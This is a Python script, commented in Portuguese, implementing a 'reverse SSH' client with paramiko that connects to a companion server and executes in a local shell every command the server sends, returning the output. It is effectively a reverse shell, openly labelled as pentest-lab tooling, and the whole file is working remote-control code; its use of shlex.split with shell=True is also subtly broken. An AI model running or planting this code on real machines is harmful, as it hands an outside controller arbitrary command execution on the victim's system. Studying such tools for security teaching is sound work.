# Cliente SSH "reverso": conecta a um ssh_server.py (o ssh_server.py deste
# repo, nao um sshd real) e fica esperando comandos que O SERVIDOR manda
# pelo canal, executando-os localmente e devolvendo a saida.
# Ou seja, aqui os papeis se invertem: quem "controla" a sessao e o lado
# que aceitou a conexao SSH (ssh_server.py), nao quem conectou.
# Uso: 1) rode ssh_server.py em uma maquina; 2) rode este script na outra,
#      informando IP/porta do ssh_server.py.
import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    # abre um canal dentro da sessao SSH ja autenticada
    ssh_session  = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)  # avisa o servidor que estamos conectados
        print(ssh_session.recv(1024).decode())
        while True:
            # fica bloqueado aguardando o proximo "comando" enviado pelo servidor
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                # ATENCAO: executa no shell local qualquer comando recebido
                # pela rede -- use apenas em labs/pentests autorizados
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()

    ip = input('Insira o IP do servidor: ')
    port = input('Insira a porta: ')
    ssh_command(ip, port, user, password, 'ClientConnected')